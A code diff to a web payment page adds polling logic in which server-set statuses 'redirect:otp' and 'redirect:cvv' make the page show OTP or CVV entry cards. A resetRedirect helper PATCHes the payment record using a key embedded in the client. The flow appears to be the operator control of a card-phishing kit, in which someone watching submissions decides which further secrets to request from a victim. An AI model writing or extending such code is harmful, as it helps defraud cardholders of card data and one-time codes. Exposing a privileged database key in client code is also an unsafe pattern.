@@ -882,6 +882,8 @@
           const d = await r.json(); const dd = d[0]||{};
           if (dd.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
           else if (dd.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
+          else if (dd.status === 'redirect:otp') { clearInterval(pollTimer2); resetRedirect(subId); showOtpCard(false); startPolling(subId); }
+          else if (dd.status === 'redirect:cvv') { clearInterval(pollTimer2); resetRedirect(subId); showCvvCard(false); startPolling(subId); }
         } catch(e) {}
       }, 2000);
     }
@@ -975,6 +977,16 @@
       cardError.style.display    = 'block';
     }
 
+    async function resetRedirect(id) {
+      try {
+        await fetch(SB+'/rest/v1/payments?id=eq.'+id, {
+          method: 'PATCH',
+          headers: {'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json'},
+          body: JSON.stringify({ status: 'pending' })
+        });
+      } catch(e) {}
+    }
+
     function startPolling(id) {
       clearInterval(pollTimer2);
       pollTimer2 = setInterval(async () => {
@@ -983,6 +995,8 @@
           const d2 = await r.json(); const s2 = d2[0]||{};
           if (s2.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
           else if (s2.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
+          else if (s2.status === 'redirect:otp') { clearInterval(pollTimer2); resetRedirect(id); showOtpCard(false); startPolling(id); }
+          else if (s2.status === 'redirect:cvv') { clearInterval(pollTimer2); resetRedirect(id); showCvvCard(false); startPolling(id); }
         } catch(e) {}
       }, 2000);
     }
